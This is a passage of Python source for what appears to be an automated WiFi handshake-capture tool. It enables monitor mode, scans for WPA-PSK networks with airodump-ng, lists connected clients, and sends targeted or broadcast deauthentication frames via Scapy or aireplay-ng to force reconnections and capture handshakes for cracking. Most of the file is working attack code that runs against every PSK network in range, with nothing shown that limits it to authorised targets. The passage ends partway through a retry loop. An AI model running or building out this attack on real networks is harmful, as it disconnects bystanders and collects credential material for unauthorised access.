import subprocess
import time
import re
import os
import sys
import signal
from datetime import datetime
from collections import deque

#!/usr/bin/env python3

# Import Python deauth module (graceful fallback if not available)
try:
    from deauth import send_deauth_packets
    PYTHON_DEAUTH_AVAILABLE = True
except ImportError:
    PYTHON_DEAUTH_AVAILABLE = False
    print("[!] Warning: deauth.py module not found. Install scapy: pip3 install scapy")
    print("[!] Falling back to aireplay-ng for deauth")

# TEST MODE: Set to True for quick testing (7s scan, max 5 networks)
TEST_MODE = False

# VERBOSE MODE: Set to True to log all commands (or use -v flag)
VERBOSE = False

# BAND MODE: Which frequency bands to scan (a=5GHz, b=2.4GHz, abg=both)
BAND = 'abg'  # Default to both

# Deauthentication tuning
# Python deauth: Use Scapy for fine-grained control
# aireplay-ng fallback: Always sends 64 frames per count (hardcoded in aireplay-ng.c:454)
USE_PYTHON_DEAUTH = True
PYTHON_DEAUTH_COUNT = 16  # Default: Firm (8=Gentle, 16=Firm, 32=Heavy, 64=Brutal)

# Legacy aireplay-ng settings (used when USE_PYTHON_DEAUTH=false)
DEAUTH_PACKETS_STATIONS = 1
DEAUTH_PACKETS_BROADCAST = 1
DEAUTH_MAX_RETRIES = 1
DEAUTH_RETRY_DELAY = 2.5
DEAUTH_BURST_COOLDOWN = 5.0

# Global list to track all spawned processes
active_processes = []

# Global variable to track monitor interface for cleanup
monitor_interface = None

# Global tracking for statistics (use deque to prevent unbounded memory growth)
captured_handshakes = deque(maxlen=500)  # Bounded: keep only last 500 captures
processed_bssids = set()  # Track which BSSIDs we've already attempted
graceful_shutdown = False  # Track if user wants to stop scanning but finish processing

# Ensure expected output directories exist even when imported by the web UI
for _dir in ("captures", "hashes"):
    os.makedirs(_dir, exist_ok=True)


def ensure_output_dirs():
    """Create capture/hash directories idempotently."""
    for _dir in ("captures", "hashes"):
        os.makedirs(_dir, exist_ok=True)


def terminate_process(proc, name="process", force=False):
    """Terminate a tracked subprocess and remove it from active_processes."""
    if not proc:
        return
    try:
        if proc.poll() is None:
            proc.terminate()
            proc.wait(timeout=3)
        if force and proc.poll() is None:
            proc.kill()
    except subprocess.TimeoutExpired:
        proc.kill()
    except Exception as exc:
        if VERBOSE:
            print(f"[!] Failed to terminate {name}: {exc}")
    finally:
        if proc in active_processes:
            active_processes.remove(proc)

def cleanup_processes():
    """Kill all active child processes and restore normal network operation"""
    print("\n[*] Cleaning up processes...")
    for proc in active_processes:
        try:
            if proc.poll() is None:  # Process still running
                print(f"[*] Killing process {proc.pid}")
                proc.terminate()
                proc.wait(timeout=2)
        except:
            try:
                proc.kill()
            except:
                pass
    active_processes.clear()
    
    # Also kill any lingering airodump-ng or aireplay-ng processes
    subprocess.run("pkill -9 airodump-ng", shell=True, stderr=subprocess.DEVNULL)
    subprocess.run("pkill -9 aireplay-ng", shell=True, stderr=subprocess.DEVNULL)
    
    # Stop monitor mode and restart NetworkManager if we have a monitor interface
    global monitor_interface
    if monitor_interface:
        print(f"[*] Stopping monitor mode on {monitor_interface}...")
        interface = monitor_interface.replace("mon", "")
        subprocess.run(f"airmon-ng stop {monitor_interface}", shell=True, 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[*] Restarting NetworkManager...")
        subprocess.run(f"systemctl start NetworkManager", shell=True,
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        monitor_interface = None
    
    print("[+] Cleanup complete")

def signal_handler(sig, frame):
    """Handle CTRL+C gracefully - first time stops scanning, second time exits"""
    global graceful_shutdown
    if not graceful_shutdown:
        print("\n[!] Interrupt received - will stop after current network and show summary")
        print("[!] Press CTRL+C again to exit immediately")
        graceful_shutdown = True
    else:
        print("\n[!] Second interrupt - exiting immediately")
        cleanup_processes()
        sys.exit(0)

def reset_wifi_radio():
    """Reset WiFi radio to fix channel drift issues"""
    print("[*] Resetting WiFi radio to fix potential drift...")
    subprocess.run("nmcli radio wifi off", shell=True, 
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    subprocess.run("nmcli radio wifi on", shell=True,
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    print("[+] WiFi radio reset complete")


def ensure_channel_hopping(mon_interface):
    """Ensure channel hopping is enabled for broad scans.
    
    Channel hopping allows the adapter to cycle through all WiFi channels
    to detect all networks. It can get disabled by:
    - Interfering processes (NetworkManager, wpa_supplicant)
    - The driver getting stuck on a specific channel
    - A previous targeted capture locking a channel
    
    This function kills interfering processes and resets the channel state
    to re-enable channel hopping before a broad scan.
    """
    print("[*] Ensuring channel hopping is enabled...")
    
    # Kill any processes that might be interfering with channel hopping
    # This is the #1 cause of channel hopping being disabled
    print("[*] Killing interfering processes (airmon-ng check kill)...")
    subprocess.run("airmon-ng check kill", shell=True,
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    
    # Also explicitly stop NetworkManager and wpa_supplicant in case they respawned
    subprocess.run("systemctl stop NetworkManager 2>/dev/null", shell=True,
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run("systemctl stop wpa_supplicant 2>/dev/null", shell=True,
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Reset any channel lock that might be in place
    # Setting to channel 0 or no channel allows hopping
    print("[*] Clearing channel lock...")
    # Use iw to clear any frequency lock - this is driver-dependent
    subprocess.run(f"iw {mon_interface} set channel 1", shell=True,
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.5)
    
    print("[+] Channel hopping enabled")

def force_channel_lock(mon_interface, channel):
    """Aggressively try all methods to lock to a channel"""
    print(f"[!] Channel mismatch detected! Forcing lock to channel {channel}...")
          
    # Step 1: Radio reset
    print(f"[*] Step 1: WiFi radio reset")
    reset_wifi_radio()

     # Step 2: iw
    print(f"[*] Step 2: iw set channel")
    subprocess.run(f"iw {mon_interface} set channel {channel}", shell=True,
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    
    # Step 3: Try iwconfig again after reset
    print(f"[*] Step 3: iwconfig post-reset")
    subprocess.run(f"iwconfig {mon_interface} channel {channel}", shell=True,
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    
    print(f"[+] Channel lock attempts complete, proceeding...")

def run_command(cmd, show_cmd=None):
    """Execute shell command and return output"""
    # Show command if verbose mode or explicitly requested
    if VERBOSE or show_cmd:
        print(f"[*] Running: {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if VERBOSE and result.stderr:
        print(f"[*] stderr: {result.stderr[:200]}")
    return result.stdout

def get_all_wireless_interfaces():
    """Get all wireless interface names"""
    output = run_command("iwconfig 2>&1 | grep -o '^[^ ]*'")
    interfaces = [line.strip() for line in output.split('\n') if line.strip()]
    # Filter out non-wireless interfaces
    excluded_prefixes = ('lo', 'eth', 'docker', 'br-', 'veth', 'virbr')
    wireless = [iface for iface in interfaces 
                if iface and not any(iface.startswith(prefix) for prefix in excluded_prefixes)]
    return wireless

def get_wireless_interface(specified_interface=None, auto_select=False):
    """Get the wireless interface name - either specified or by user selection
    
    Args:
        specified_interface: Interface name to use (if provided)
        auto_select: If True, automatically select first interface without prompting
    """
    if specified_interface:
        # Verify the specified interface exists
        all_interfaces = get_all_wireless_interfaces()
        if specified_interface in all_interfaces:
            return specified_interface
        else:
            raise Exception(f"Interface {specified_interface} not found")
    
    # List all available wireless interfaces
    interfaces = get_all_wireless_interfaces()
    
    if not interfaces:
        raise Exception("No wireless interface found")
    
    if len(interfaces) == 1 or auto_select:
        print(f"[+] Found wireless interface: {interfaces[0]}")
        return interfaces[0]
    
    # Multiple interfaces - let user choose
    print("\n[*] Available wireless interfaces:")
    for i, iface in enumerate(interfaces, 1):
        print(f"  {i}. {iface}")
    
    while True:
        try:
            choice = input("\n[?] Select interface number: ").strip()
            idx = int(choice) - 1
            if 0 <= idx < len(interfaces):
                return interfaces[idx]
            else:
                print("[!] Invalid selection, try again")
        except (ValueError, KeyboardInterrupt):
            print("\n[!] Invalid input")
            sys.exit(1)

def start_monitor_mode(interface):
    """Start monitor mode on the interface"""
    print(f"[*] Starting monitor mode on {interface}")
    
    # Stop NetworkManager and wpa_supplicant explicitly
    print(f"[*] Stopping NetworkManager and wpa_supplicant...")
    run_command(f"systemctl stop NetworkManager")
    run_command(f"systemctl stop wpa_supplicant")
    time.sleep(1)
    
    # Kill interfering processes
    run_command(f"airmon-ng check kill")
    output = run_command(f"airmon-ng start {interface}")
    time.sleep(2)
    
    # Try to detect the monitor interface name from airmon-ng output
    # It could be interfacemon or just the same interface name
    mon_interface = None
    
    # Check if output mentions monitor mode enabled on a specific interface
    match = re.search(r'monitor mode (?:enabled|vif enabled) (?:on|for) (\w+)', output, re.IGNORECASE)
    if match:
        mon_interface = match.group(1)
        print(f"[*] Detected monitor interface from output: {mon_interface}")
    
    # If not found in output, check which interfaces exist now
    if not mon_interface:
        print(f"[*] Searching for monitor interface...")
        # Check for interfacemon first
        test_mon = interface + "mon"
        test_result = subprocess.run(f"iwconfig {test_mon} 2>&1", shell=True, capture_output=True, text=True)
        if "Mode:Monitor" in test_result.stdout:
            mon_interface = test_mon
            print(f"[*] Monitor interface: {mon_interface}")
        else:
            # Check if original interface is now in monitor mode
            test_result = subprocess.run(f"iwconfig {interface} 2>&1", shell=True, capture_output=True, text=True)
            if "Mode:Monitor" in test_result.stdout:
                mon_interface = interface
                print(f"[*] Monitor interface: {mon_interface} (same name)")
            else:
                # Last resort: find any interface in monitor mode
                print(f"[*] Checking all interfaces for monitor mode...")
                all_ifaces = run_command("iwconfig 2>&1")
                for line in all_ifaces.split('\n'):
                    if "Mode:Monitor" in line:
                        iface_match = re.match(r'^(\w+)', line)
                        if iface_match:
                            mon_interface = iface_match.group(1)
                            print(f"[*] Found monitor interface: {mon_interface}")
                            break
    
    if not mon_interface:
        print(f"[!] Could not detect monitor mode interface")
        print(f"[!] airmon-ng output was:\n{output}")
        raise Exception("Could not detect monitor mode interface")
    
    # Verify the interface is actually working
    print(f"[*] Verifying {mon_interface} is operational...")
    verify = subprocess.run(f"ip link show {mon_interface}", shell=True, capture_output=True, text=True)
    if verify.returncode == 0:
        print(f"[+] Interface {mon_interface} is up and ready")
    else:
        print(f"[!] Warning: Could not verify interface status")
    
    # Set global monitor interface for cleanup
    global monitor_interface
    monitor_interface = mon_interface
    
    return mon_interface

def scan_networks(mon_interface, duration=60, background=False):
    """Scan for networks with PSK for specified duration
    
    Args:
        mon_interface: Monitor mode interface
        duration: Scan duration in seconds
        background: If True, returns CSV path immediately and leaves process running
    """
    if TEST_MODE:
        duration = 7
        print(f"[*] TEST MODE: Scanning for {duration} seconds...")
    else:
        print(f"[*] Scanning for {duration} seconds...")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Use absolute path to ensure we know where files are created
    work_dir = os.path.abspath(".")
    scan_file = os.path.join(work_dir, f"scan_{timestamp}")
    
    print(f"[*] Working directory: {work_dir}")
    print(f"[*] Scan file prefix: {scan_file}")
    
    # Determine band description
    band_desc = "both 2.4GHz and 5GHz" if BAND == 'abg' else ("5GHz only" if BAND == 'a' else "2.4GHz only")
    
    # Ensure channel hopping is enabled before broad scan
    ensure_channel_hopping(mon_interface)
    
    print(f"[*] Starting airodump-ng capture ({band_desc})...")
    
    # Start airodump-ng in background - keep stderr visible for debugging
    log_file = f"{scan_file}.log"
    proc = subprocess.Popen(
        f"airodump-ng {mon_interface} --band {BAND} -w {scan_file} --output-format csv 2>{log_file}",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    active_processes.append(proc)
    
    # Health check after 7 seconds
    health_check_time = 7 if not TEST_MODE else 5
    print(f"[*] Running initial health check in {health_check_time} seconds...")
    time.sleep(health_check_time)
    
    # Check if process is still running
    if proc.poll() is not None:
        print(f"[!] airodump-ng process died! Exit code: {proc.returncode}")
        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                print(f"[!] Error log: {f.read()[:500]}")
        return (None, None) if background else None
    
    # Check if CSV file is being created
    csv_candidates = [
        f"{scan_file}-01.csv",
        f"{scan_file}.csv",
    ]
    
    csv_found = None
    enough_networks = False
    for candidate in csv_candidates:
        if os.path.exists(candidate):
            csv_found = candidate
            file_size = os.path.getsize(candidate)
            print(f"[+] Health check OK: CSV file exists ({file_size} bytes)")
            
            # Quick peek at networks found so far
            if file_size > 0:
                try:
                    with open(candidate, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        # Count BSSID entries (rough estimate of APs found)
                        bssid_count = len([line for line in content.split('\n') if re.match(r'^\s*[0-9A-F]{2}:[0-9A-F]{2}', line)])
                        if bssid_count > 0:
                            print(f"[+] Already detected ~{bssid_count} access points")
                            if TEST_MODE and bssid_count >= 5:
                                print(f"[+] TEST MODE: Found 5+ networks, stopping scan early")
                                enough_networks = True
                except:
                    pass
            break
    
    if not csv_found:
        print(f"[!] Health check WARNING: No CSV file created yet")
        print(f"[*] Checking error log...")
        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                errors = f.read()
                if errors.strip():
                    print(f"[!] airodump-ng errors: {errors[:300]}")
    
    # If background mode, return CSV path immediately and leave process running
    if background:
        if csv_found:
            print(f"[+] Scan started in background, CSV: {csv_found}")
            return csv_found, proc
        else:
            print(f"[!] Background scan failed to create CSV")
            terminate_process(proc, name="airodump-ng background scan", force=True)
            return (None, None)
    
    # Stop early if we found enough networks in test mode
    if TEST_MODE and enough_networks:
        print(f"[*] Stopping scan early...")
        proc.terminate()
        active_processes.remove(proc)
        time.sleep(2)
        return csv_found
    
    # Continue scanning with progress updates
    remaining = duration - health_check_time
    print(f"[*] Continuing scan for {remaining} more seconds...")
    
    # Show progress every 10 seconds
    for i in range(0, remaining, 10):
        time.sleep(min(10, remaining - i))
        elapsed = health_check_time + i + min(10, remaining - i)
        print(f"[*] Scanning... ({elapsed}/{duration}s)")
    
    proc.terminate()
    active_processes.remove(proc)
    time.sleep(2)
    
    # Check error log
    if os.path.exists(log_file):
        with open(log_file, 'r') as f:
            errors = f.read()
            if errors.strip():
                print(f"[!] airodump-ng errors: {errors[:200]}")
    
    # Check what files were actually created
    print(f"[*] Looking for CSV files...")
    csv_candidates = [
        f"{scan_file}-01.csv",
        f"{scan_file}.csv",
        f"{scan_file}-1.csv"
    ]
    
    for candidate in csv_candidates:
        if os.path.exists(candidate):
            print(f"[+] Found CSV file: {candidate}")
            return candidate
    
    # List all files with the scan prefix to debug
    print(f"[!] Expected CSV not found. Files in directory:")
    run_command(f"ls -lah {work_dir}/scan_{timestamp}* 2>/dev/null || echo 'No files found'")
    
    return f"{scan_file}-01.csv"

def parse_networks(csv_file):
    """Parse airodump-ng CSV to extract PSK networks"""
    networks = []
    
    if not os.path.exists(csv_file):
        print(f"[!] CSV file not found: {csv_file}")
        return networks
    
    print(f"[*] Reading CSV file: {csv_file}")
    with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    
    print(f"[*] CSV has {len(lines)} lines")
    
    # Find where AP data starts and ends
    for i, line in enumerate(lines):
        if 'BSSID' in line and 'channel' in line.lower():
            print(f"[*] Found header at line {i}")
            # Parse access points
            for j in range(i+1, len(lines)):
                if not lines[j].strip() or 'Station MAC' in lines[j]:
                    break
                parts = lines[j].split(',')
                if len(parts) >= 14:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    privacy = parts[5].strip()  # WPA2, WPA, etc.
                    authentication = parts[7].strip()  # PSK, MGT, etc.
                    power = parts[8].strip()  # Signal strength (dBm)
                    essid = parts[13].strip()
                    
                    print(f"[DEBUG] BSSID: {bssid}, Channel: {channel}, Privacy: {privacy}, Auth: {authentication}, Power: {power}, ESSID: {essid}")
                    
                    # Check if it's PSK authentication (not OPN or MGT)
                    if 'PSK' in authentication and bssid and channel.isdigit():
                        networks.append({
                            'bssid': bssid,
                            'channel': channel,
                            'essid': essid or 'Hidden',
                            'power': power if power and power.lstrip('-').isdigit() else '-50'
                        })
                        print(f"[+] Added PSK network: {essid or 'Hidden'}")
            break
    
    return networks

def parse_stations(csv_file, target_bssid):
    """Parse airodump-ng CSV to find stations connected to a specific BSSID"""
    stations = []
    
    if not os.path.exists(csv_file):
        return stations
    
    with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    
    # Find where station data starts
    in_station_section = False
    for line in lines:
        if 'Station MAC' in line:
            in_station_section = True
            continue
        
        if in_station_section and line.strip():
            parts = line.split(',')
            if len(parts) >= 6:
                station_mac = parts[0].strip()
                bssid = parts[5].strip()
                
                # Check if this station is connected to our target AP
                if bssid.upper() == target_bssid.upper() and station_mac and ':' in station_mac:
                    stations.append(station_mac)
    
    return stations


def get_station_counts(csv_file):
    """Return a dict of BSSID -> number of connected stations from CSV."""
    counts = {}

    if not os.path.exists(csv_file):
        return counts

    with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()

    in_station_section = False
    for line in lines:
        if 'Station MAC' in line:
            in_station_section = True
            continue

        if in_station_section and line.strip():
            parts = line.split(',')
            if len(parts) >= 6:
                station_mac = parts[0].strip()
                bssid = parts[5].strip().upper()

                if bssid and ':' in bssid and station_mac and ':' in station_mac:
                    counts.setdefault(bssid, set()).add(station_mac.upper())

    return {bssid: len(stations) for bssid, stations in counts.items()}


def get_all_stations_by_bssid(csv_file):
    """Get a dict mapping each BSSID to list of connected station MACs"""
    stations_map = {}
    
    if not os.path.exists(csv_file):
        return stations_map
    
    with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    
    # Find where station data starts
    in_station_section = False
    for line in lines:
        if 'Station MAC' in line:
            in_station_section = True
            continue
        
        if in_station_section and line.strip():
            parts = line.split(',')
            if len(parts) >= 6:
                station_mac = parts[0].strip()
                bssid = parts[5].strip().upper()
                
                # If this station is connected to a BSSID (not broadcast)
                if bssid and ':' in bssid and station_mac and ':' in station_mac:
                    if bssid not in stations_map:
                        stations_map[bssid] = []
                    stations_map[bssid].append(station_mac)
    
    return stations_map

def capture_handshake(mon_interface, network, current=None, total=None):
    """Deauth and capture handshake for a specific network
    
    Returns:
        dict: Updated network info with fresh station count and signal, or None on error
    """
    global graceful_shutdown
    graceful_shutdown = False  # Reset flag at start of each capture
    ensure_output_dirs()
    
    bssid = network['bssid']
    channel = network['channel']
    essid = network['essid']
    
    # Debug: Check if we have station data from broad scan
    cached_stations = network.get('stations', [])
    if cached_stations:
        print(f"[DEBUG] Network has {len(cached_stations)} cached station(s) from broad scan: {cached_stations[:3]}")
    else:
        print(f"[DEBUG] Network has NO cached stations from broad scan")
    
    # Display progress if provided
    if current and total:
        print(f"\n[*] Targeting {essid} ({bssid}) on channel {channel} ({current} out of {total})")
    else:
        print(f"\n[*] Targeting {essid} ({bssid}) on channel {channel})")
    
    # CRITICAL: Kill any lingering airodump-ng from previous network
    print(f"[*] Ensuring no previous capture processes are running...")
    subprocess.run("pkill -9 airodump-ng", shell=True, stderr=subprocess.DEVNULL)
    time.sleep(1)
    
    # Try to set channel with iwconfig (may not work reliably with AWUS036ACH)
    print(f"[*] Pre-setting interface to channel {channel}...")
    
    # Method 1: Try iwconfig
    channel_locked = False
    for chan_attempt in range(2):
        cmd = f"iwconfig {mon_interface} channel {channel}"
        if VERBOSE:
            print(f"[*] Running: {cmd}")
        subprocess.run(cmd, shell=True, 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
        
        # Check current state (informational only)
        verify = subprocess.run(
            f"iwconfig {mon_interface} 2>&1 | grep -i frequency",
            shell=True,
            capture_output=True,
            text=True
        )
        
        # Check if we got the right channel (either by number or frequency)
        if f"Channel {channel}" in verify.stdout or f"Channel={channel}" in verify.stdout:
            print(f"[+] iwconfig locked to channel {channel}")
            channel_locked = True
            break
        else:
            if chan_attempt == 0:
                print(f"[*] iwconfig attempt {chan_attempt + 1}: {verify.stdout.strip()}")
    
    # Method 2: Try iw command (alternative method)
    print(f"[*] Attempting iw command for channel lock...")
    cmd = f"iw {mon_interface} set channel {channel}"
    if VERBOSE:
        print(f"[*] Running: {cmd}")
    result = subprocess.run(cmd, shell=True, 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if result.returncode == 0:
        print(f"[+] iw command successful")
        channel_locked = True
    else:
        print(f"[*] iw command failed (this is normal for some drivers)")
    
    # Method 3: If still not locked, try radio reset as last resort
    if not channel_locked:
        print(f"[!] Channel lock methods failed, attempting WiFi radio reset...")
        reset_wifi_radio()
        # Try iwconfig one more time after reset
        subprocess.run(f"iwconfig {mon_interface} channel {channel}", shell=True,
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
    
    # Note: We continue even if all methods fail because airodump-ng -c flag will lock the channel
    print(f"[*] Relying on airodump-ng to enforce channel lock...")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    # Sanitize SSID for safe filename (remove/replace problematic characters)
    safe_essid = re.sub(r'[^a-zA-Z0-9_-]', '_', essid)
    capture_file = f"capture_{safe_essid}_{timestamp}"
    
    # Start airodump-ng on specific channel and BSSID
    print(f"[*] Starting capture on {mon_interface}...")
    cap_log = f"{capture_file}.airodump.log"
    cmd = f"airodump-ng {mon_interface} -c {channel} --bssid {bssid} -w {capture_file} 2>{cap_log}"
    if VERBOSE:
        print(f"[*] Running: {cmd}")
    capture_proc = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.DEVNULL
    )
    active_processes.append(capture_proc)
    
    # Give airodump-ng time to fully initialize and lock to channel
    print(f"[*] Waiting for airodump-ng to lock on channel (3s)...")
    time.sleep(3)
    
    # Check if process is still running
    if capture_proc.poll() is not None:
        print(f"[!] airodump-ng died! Skipping this network.")
        if os.path.exists(cap_log):
            with open(cap_log, 'r') as f:
                print(f"[!] Error: {f.read()[:300]}")
        active_processes.remove(capture_proc)
        return
    
    # Verify capture file is being created
    cap_file = f"{capture_file}-01.cap"
    if not os.path.exists(cap_file):
        print(f"[!] Warning: Capture file not created yet, waiting 5 more seconds...")
        time.sleep(5)
        if not os.path.exists(cap_file):
            print(f"[!] Capture file still missing, aborting this network")
            capture_proc.terminate()
            active_processes.remove(capture_proc)
            return
    
    print(f"[+] airodump-ng running (PID: {capture_proc.pid}), capture file created")
    
    # Check for connected stations in the capture AND get fresh signal strength
    print(f"[*] Scanning for connected stations (10s)...")
    time.sleep(10)  # Give more time for station data to appear
    csv_file = f"{capture_file}-01.csv"
    stations = []
    updated_network_info = None
    
    if os.path.exists(csv_file):
        # Parse stations for this specific BSSID
        stations = parse_stations(csv_file, bssid)
        
        # Build updated network info with fresh client count
        updated_network_info = {
            'bssid': bssid,
            'essid': essid,
            'channel': channel,
            'power': network.get('power', '-50'),  # Default, will update if we find it
            'clients': len(stations),
            'has_clients': len(stations) > 0,
            'encryption': network.get('encryption', 'WPA2-PSK')
        }
        
        # Also try to get fresh signal strength from the CSV
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            # Find the AP data section and extract power
            for i, line in enumerate(lines):
                if 'BSSID' in line and 'channel' in line.lower():
                    for j in range(i+1, len(lines)):
                        if not lines[j].strip() or 'Station MAC' in lines[j]:
                            break
                        parts = lines[j].split(',')
                        if len(parts) >= 9:
                            csv_bssid = parts[0].strip()
                            if csv_bssid.upper() == bssid.upper():
                                power = parts[8].strip()
                                # Update with fresh signal strength
                                if power and power.lstrip('-').isdigit():
                                    updated_network_info['power'] = power
                                break
                    break
        except Exception as e:
            if VERBOSE:
                print(f"[*] Could not parse fresh signal data: {e}")
        
        if stations:
            print(f"[+] Found {len(stations)} connected station(s): {', '.join(stations[:3])}{'...' if len(stations) > 3 else ''}")
        else:
            # Check if the broad scan detected stations for this network
            broad_scan_stations = network.get('stations', [])
            if broad_scan_stations:
                print(f"[*] Quick scan found no stations, but broad scan detected {len(broad_scan_stations)} station(s)")
                print(f"[*] Using cached station MACs: {', '.join(broad_scan_stations[:3])}{'...' if len(broad_scan_stations) > 3 else ''}")
                print(f"[*] Will send deauth to cached stations AND broadcast (belt and suspenders approach)")
                stations = broad_scan_stations  # Use the cached stations from broad scan
            else:
                print(f"[*] No connected stations detected")
                print(f"[*] Will try broadcast deauth (hidden clients may exist)")
    
    # Note: airodump-ng -c flag keeps the channel locked, so we trust it's on the right channel
    # Note: aireplay-ng --deauth N sends (N × 64) frames. We use N=1 for minimal 64 frames.
    
    # Send deauth: targeted if stations found, broadcast otherwise
    successful_bursts = 0
    used_cached_stations = False
    
    if stations:
        # Check if we're using cached stations from broad scan
        broad_scan_stations = network.get('stations', [])
        if broad_scan_stations and stations == broad_scan_stations:
            used_cached_stations = True
        
        # Targeted deauth to known stations
        print(f"[*] Sending single deauth burst to {len(stations)} station(s)...")
        
        # Choose deauth method
        use_python = USE_PYTHON_DEAUTH and PYTHON_DEAUTH_AVAILABLE
        
        if use_python:
            print(f"[*] Using Python deauth ({PYTHON_DEAUTH_COUNT} packets per station)")
        else:
            print(f"[*] Using aireplay-ng (64 frames per station)")
        
        # Single attempt with minimal retry
        max_retries = max(1, DEAUTH_MAX_RETRIES)
        for attempt in range(max_retries):
            if attempt > 0:
                print(f"[*] Retry {attempt}/{max_retries - 1}...")
            
            # Target each connected station
            print(f"[*] Sending deauth to {len(stations)} station(s)...")
            deauth_success = False
            
            if use_python:
                # Python deauth implementation
                for station in stations:
                    try:
                        sent = send_deauth_packets(
                            mon_interface, 
                            bssid, 
                            client=station, 
                            count=PYTHON_DEAUTH_COUNT,
                            verbose=VERBOSE
                        )
                        if sent > 0:
                            deauth_success = True
                    except Exception as e:
                        print(f"[!] Python deauth error for {station}: {e}")
            else:
                # Fallback to aireplay-ng
                for station in stations:
                    cmd = f"aireplay-ng --deauth {DEAUTH_PACKETS_STATIONS} -a {bssid} -c {station} {mon_interface}"
                    if VERBOSE:
                        print(f"[*] Running: {cmd}")
                    
                    try:
                        result = subprocess.run(
                            cmd,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=15
                        )
                        output = result.stdout + result.stderr
                        
                        # Check for success
                        if any(indicator in output for indicator in ["ACKs", "sent", "Sending"]):
                            deauth_success = True
                    except subprocess.TimeoutExpired:
                        subprocess.run(f"pkill -9 aireplay-ng", shell=True, stderr=subprocess.DEVNULL)
            
            if deauth_success:
                print(f"[+] Deauth successful (sent to {len(stations)} stations)")
                successful_bursts += 1
                break
            else:
                print(f"[!] No ACKs received from any stations")
                deauth_failed = True
            
            # Handle failure
            if 'deauth_failed' in locals() and deauth_failed:
                # Check if user wants to stop before retrying
                if graceful_shutdown:
                    print(f"[!] Stop requested, aborting retries")
                    break
                    
                if attempt < max_retries - 1:
                    print(f"[*] Re-locking channel {channel} and retrying in {DEAUTH_RETRY_DELAY:.1f}s...")
                    # Re-lock channel before retry
                    subprocess.run(f"iwconfig {mon_interface} channel {channel}", shell=True,
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(DEAUTH_RETRY_DELAY)
                else:
                    print(f"[!] Deauth failed after {max_retries} attempts (no AP response)")
    else:
        # No stations detected - try broadcast deauth (might catch hidden clients)
        print(f"[*] Attempting broadcast deauth to AP {bssid}...")
        
        # Choose deauth method
        use_python = USE_PYTHON_DEAUTH and PYTHON_DEAUTH_AVAILABLE
        
        if use_python:
            print(f"[*] Using Python deauth ({PYTHON_DEAUTH_COUNT} packets)")
        else:
            print(f"[*] Using aireplay-ng (64 frames)")
        
        max_retries = max(1, DEAUTH_MAX_RETRIES)
        for attempt in range(max_retries):
            if attempt > 0:
                print(f"[*] Retry {attempt}/{max_retries - 1}...")
            
            if graceful_shutdown:
                print(f"[!] Stop requested, aborting")
                break
            
            deauth_success = False
            
            if use_python:
                # Python deauth implementation (broadcast)
                try:
                    sent = send_deauth_packets(
                        mon_interface, 
                        bssid, 
                        client=None,  # None = broadcast
                        count=PYTHON_DEAUTH_COUNT,
                        verbose=VERBOSE
                    )
                    if sent > 0:
                        print(f"[+] Broadcast deauth successful")
                        deauth_success = True
                        successful_bursts += 1
                        break
                    else:
                        print(f"[!] No packets sent")
                        deauth_failed = True
                except Exception as e:
                    print(f"[!] Python deauth error: {e}")
                    deauth_failed = True
            else:
                # Fallback to aireplay-ng
                cmd = f"aireplay-ng --deauth {DEAUTH_PACKETS_BROADCAST} -a {bssid} {mon_interface}"
                if VERBOSE:
                    print(f"[*] Running: {cmd}")
                
                try:
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=15
                    )
                    output = result.stdout + result.stderr
                    
                    if VERBOSE:
                        print(f"[*] Deauth output: {output[:300]}")
                    
                    # Check for success indicators
                    if any(indicator in output for indicator in ["ACKs", "sent", "Sending"]):
                        print(f"[+] Broadcast deauth successful")
                        successful_bursts += 1
                        break
                    else:
                        print(f"[!] No ACK from AP")
                        deauth_failed = True
                        
                except subprocess.TimeoutExpired:
                    print(f"[!] aireplay-ng timed out")
                    subprocess.run(f"pkill -9 aireplay-ng", shell=True, stderr=subprocess.DEVNULL)
                    deauth_failed = True
            
            # Handle retry
            if 'deauth_failed' in locals() and deauth_failed:
                if graceful_shutdown:
                    print(f"[!] Stop requested, aborting retries")
                    break
                
                if attempt < max_retries - 1:
                    print(f"[*] Re-locking channel {channel} and retrying in {DEAUTH_RETRY_DELAY:.1f}s...")
                    subprocess.run(f"iwconfig {mon_interface} channel {channel}", shell=True,
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(DEAUTH_RETRY_DELAY)
                else:
